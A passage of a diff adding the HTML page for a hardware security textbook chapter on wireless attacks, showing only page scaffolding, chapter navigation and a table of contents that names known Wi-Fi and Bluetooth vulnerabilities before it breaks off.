@@ -1,0 +1,3548 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+  <meta name="theme-color" content="#ffffff">
+  
+    <meta name="description" content="Pustakālaya, a library of books on Indian knowledge traditions, science, technology and language, read page by page in the manner of an e-book reader, online or offline.">
+  
+  
+    <meta name="author" content="Nikhil Kumar Rajput, Ramanujan College, University of Delhi">
+  
+  
+    <link rel="canonical" href="https://nikhilkrajput.github.io/pustakalaya/science/hardware_security/ch36-wireless-hardware-security.html">
+  
+  
+    <link rel="prev" href="ch35-usb-and-thunderbolt-security.html">
+  
+  
+    <link rel="next" href="ch37-confidential-computing-hardware.html">
+  
+  <link rel="icon" href="../../assets/icons/favicon-32.png" sizes="32x32">
+  <link rel="icon" href="../../assets/icons/favicon.svg" type="image/svg+xml">
+  <link rel="manifest" href="../../manifest.webmanifest">
+  <link rel="apple-touch-icon" href="../../assets/icons/apple-touch-icon.png">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-title" content="Pustakālaya">
+  <meta name="apple-mobile-web-app-status-bar-style" content="default">
+  <meta name="application-name" content="Pustakālaya"><script id="bjp-books" type="application/json">[{"id": "vol01_veda", "lang": "en", "path": "vol01_veda"}, {"id": "vol02_upanisad", "lang": "en", "path": "vol02_upanisad"}, {"id": "vol03_darsana", "lang": "en", "path": "vol03_darsana"}, {"id": "vol04_buddha_jina", "lang": "en", "path": "vol04_buddha_jina"}, {"id": "vol05_yoga", "lang": "en", "path": "vol05_yoga"}, {"id": "vol06_tantra", "lang": "en", "path": "vol06_tantra"}, {"id": "vol07_itihasa", "lang": "en", "path": "vol07_itihasa"}, {"id": "vol08_kavya", "lang": "en", "path": "vol08_kavya"}, {"id": "vol09_sangita_natya", "lang": "en", "path": "vol09_sangita_natya"}, {"id": "vol10_sabda", "lang": "en", "path": "vol10_sabda"}, {"id": "vol11_ganita", "lang": "en", "path": "vol11_ganita"}, {"id": "vol12_jyotisa", "lang": "en", "path": "vol12_jyotisa"}, {"id": "vol13_ayurveda", "lang": "en", "path": "vol13_ayurveda"}, {"id": "vol14_rasayana", "lang": "en", "path": "vol14_rasayana"}, {"id": "vol15_krsi_jiva", "lang": "en", "path": "vol15_krsi_jiva"}, {"id": "vol16_vastu", "lang": "en", "path": "vol16_vastu"}, {"id": "vol17_silpa_karu", "lang": "en", "path": "vol17_silpa_karu"}, {"id": "vol18_rajaniti_dharma", "lang": "en", "path": "vol18_rajaniti_dharma"}, {"id": "vol19_vanijya_samudra", "lang": "en", "path": "vol19_vanijya_samudra"}, {"id": "vol20_yuddha", "lang": "en", "path": "vol20_yuddha"}, {"id": "vol21_bhugola", "lang": "en", "path": "vol21_bhugola"}, {"id": "vol22_manas_siksa", "lang": "en", "path": "vol22_manas_siksa"}, {"id": "vol23_jana_jati", "lang": "en", "path": "vol23_jana_jati"}, {"id": "vol24_samanvaya", "lang": "en", "path": "vol24_samanvaya"}, {"id": "hardware_security", "lang": "en", "path": "science/hardware_security"}, {"id": "drones_missiles", "lang": "en", "path": "science/drones_missiles"}, {"id": "code_to_electrons", "lang": "en", "path": "science/code_to_electrons"}, {"id": "dpi_ndr", "lang": "en", "path": "science/dpi_ndr"}, {"id": "quantum", "lang": "en", "path": "quantum/quantum"}, {"id": "qml", "lang": "en", "path": "quantum/qml"}, {"id": "asic", "lang": "en", "path": "computing/asic"}, {"id": "compute", "lang": "en", "path": "computing/compute"}, {"id": "memory", "lang": "en", "path": "computing/memory"}, {"id": "os", "lang": "en", "path": "computing/os"}, {"id": "databases", "lang": "en", "path": "computing/databases"}, {"id": "datacenters", "lang": "en", "path": "computing/datacenters"}, {"id": "networks", "lang": "en", "path": "computing/networks"}, {"id": "cellular", "lang": "en", "path": "computing/cellular"}, {"id": "ml", "lang": "en", "path": "computing/ml"}, {"id": "security", "lang": "en", "path": "cyber/security"}, {"id": "trust", "lang": "en", "path": "cyber/trust"}, {"id": "optimization_methods", "lang": "en", "path": "courses/optimization_methods"}, {"id": "quantum_computing_applications", "lang": "en", "path": "courses/quantum_computing_applications"}, {"id": "dbms_course", "lang": "en", "path": "courses/dbms_course"}, {"id": "english_book", "lang": "en", "path": "language/english_book"}, {"id": "english_book_hinglish", "lang": "en", "path": "language/english_book_hinglish"}, {"id": "english_book_hi", "lang": "hi", "path": "language/english_book_hi"}]</script><script>
+    try {
+      if ((window.matchMedia && (matchMedia("(display-mode: standalone)").matches || matchMedia("(display-mode: fullscreen)").matches)) || navigator.standalone === true) {
+        document.documentElement.className += " bjp-standalone";
+      }
+    } catch (e) { /* not an installed app */ }
+  </script>
+  <script>
+    /* a book opened from its cover on the shelf: the page stays blank, in the cover's colour, until the reader is up */
+    try {
+      var cv = sessionStorage.getItem("bjp.reader.cover");
+      if (cv && sessionStorage.getItem("bjp.reader.open") === "1") {
+        var c = JSON.parse(cv), de = document.documentElement;
+        de.className += " bjp-booting";
+        if (c && /^#[0-9a-f]{3,8}$/i.test(c.bg || "")) de.style.background = c.bg;
+        setTimeout(function () { de.classList.remove("bjp-booting"); de.style.background = ""; }, 3000);
+      }
+    } catch (e) { /* no session storage: the page simply opens as usual */ }
+  </script>
+
+    
+      
+        <title>36. Wireless Hardware Security - Pustakālaya</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Serif:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Noto Serif";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/extra.css">
+    
+      <link rel="stylesheet" href="../../assets/reader.css">
+    
+      <link rel="stylesheet" href="../../assets/app.css">
+    
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+Devanagari:wght@400;600;700&display=swap">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#sec-wireless-taxonomy" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../index.html" title="Pustakālaya" class="md-header__button md-logo" aria-label="Pustakālaya" data-md-component="logo">
+      
+  <img src="../../assets/icons/logo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Pustakālaya
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              36. Wireless Hardware Security
+            
+          </span>
+        </div>
+      </div>
+    </div><a href="../../index.html" class="bjp-libbtn" aria-label="Library: all books" title="Library: all books">
+      <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 20V5h4v15M8 20V9h4v11M14 20L12.6 6l3.8-.8 3 14.2M3 20h18"/></svg><span>Library</span>
+    </a>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="custom" data-md-color-accent="custom"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary bjp-nav bjp-nav--book" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../index.html" title="Pustakālaya" class="md-nav__button md-logo" aria-label="Pustakālaya" data-md-component="logo">
+      
+  <img src="../../assets/icons/logo.svg" alt="logo">
+
+    </a>
+    Pustakālaya
+  </label>
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      <li class="md-nav__item bjp-nav-all">
+        <a href="../../index.html" class="md-nav__link" aria-label="All books: back to the library">
+          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M19 12H5M11 6l-6 6 6 6"/></svg>
+          <span class="md-ellipsis">All books</span>
+        </a>
+      </li>
+      <li class="md-nav__item bjp-nav-book" role="presentation"><span class="bjp-nav-head">Hardware Security</span></li>
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="index.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview and preface
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch01-trusted-platform-module-tpm-2-0.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1. Trusted Platform Module (TPM 2.0)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch02-hardware-security-module-hsm.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2. Hardware Security Module (HSM)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch03-physically-unclonable-functions-puf.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3. Physically Unclonable Functions (PUF)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch04-trusted-execution-environment-tee.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4. Trusted Execution Environment (TEE)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch05-hardware-root-of-trust.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5. Hardware Root of Trust
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch06-side-channel-attack-protection.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6. Side-Channel Attack Protection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch07-hardware-trojan-detection.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7. Hardware Trojan Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch08-secure-boot.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8. Secure Boot
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch09-true-random-number-generator-trng.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9. True Random Number Generator (TRNG)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch10-fpga-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10. FPGA Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch11-iommu-and-dma-protection.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    11. IOMMU and DMA Protection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch12-memory-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    12. Memory Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch13-anti-tamper-technologies.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    13. Anti-Tamper Technologies
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch14-hardware-attestation.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    14. Hardware Attestation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch15-automotive-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    15. Automotive Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch16-post-quantum-cryptography-hardware.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    16. Post-Quantum Cryptography Hardware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch17-jtag-and-debug-interface-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    17. JTAG and Debug Interface Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch18-hardware-cryptographic-accelerators.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    18. Hardware Cryptographic Accelerators
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch19-secure-key-management.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    19. Secure Key Management
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch20-iot-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    20. IoT Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch21-secure-elements-and-smart-cards.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    21. Secure Elements and Smart Cards
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch22-fido2-and-webauthn-hardware-security-keys.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    22. FIDO2 and WebAuthn Hardware Security Keys
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch23-hardware-cryptocurrency-wallets.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    23. Hardware Cryptocurrency Wallets
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch24-network-security-processors.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    24. Network Security Processors
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch25-cheri-capability-hardware.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    25. CHERI Capability Hardware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch26-risc-v-security-extensions.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    26. RISC-V Security Extensions
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch27-formal-verification-of-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    27. Formal Verification of Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch28-hardware-supply-chain-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    28. Hardware Supply Chain Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch29-5g-and-telecom-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    29. 5G and Telecom Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch30-medical-device-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    30. Medical Device Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch31-ics-and-scada-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    31. ICS and SCADA Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch32-biometric-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    32. Biometric Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch33-satellite-and-aerospace-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    33. Satellite and Aerospace Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch34-ai-and-ml-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    34. AI and ML Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch35-usb-and-thunderbolt-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    35. USB and Thunderbolt Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    36. Wireless Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="ch36-wireless-hardware-security.html" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    36. Wireless Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#sec-wireless-taxonomy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.1 Wireless Attack Taxonomy
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-sdr-hw" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.2 SDR Hardware Platform Architecture
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-wifi-hw" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.3 Wi-Fi Hardware Security
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="36.3 Wi-Fi Hardware Security">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3631-wi-fi-chipset-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.3.1 Wi-Fi Chipset Overview
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3632-broadpwn-cve-2017-0561" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.3.2 Broadpwn – CVE-2017-0561
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3633-kr00k-cve-2019-15126" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.3.3 Kr00k – CVE-2019-15126
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3634-wpa3-sae-dragonfly-and-pmkid-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.3.4 WPA3 SAE (Dragonfly) and PMKID Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-bluetooth-hw" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.4 Bluetooth Hardware Security
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="36.4 Bluetooth Hardware Security">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3641-bluetooth-hardware-chipsets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.4.1 Bluetooth Hardware Chipsets
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3642-knob-attack-cve-2019-9506" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.4.2 KNOB Attack – CVE-2019-9506
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3643-bias-attack-cve-2020-10135" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.4.3 BIAS Attack – CVE-2020-10135
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
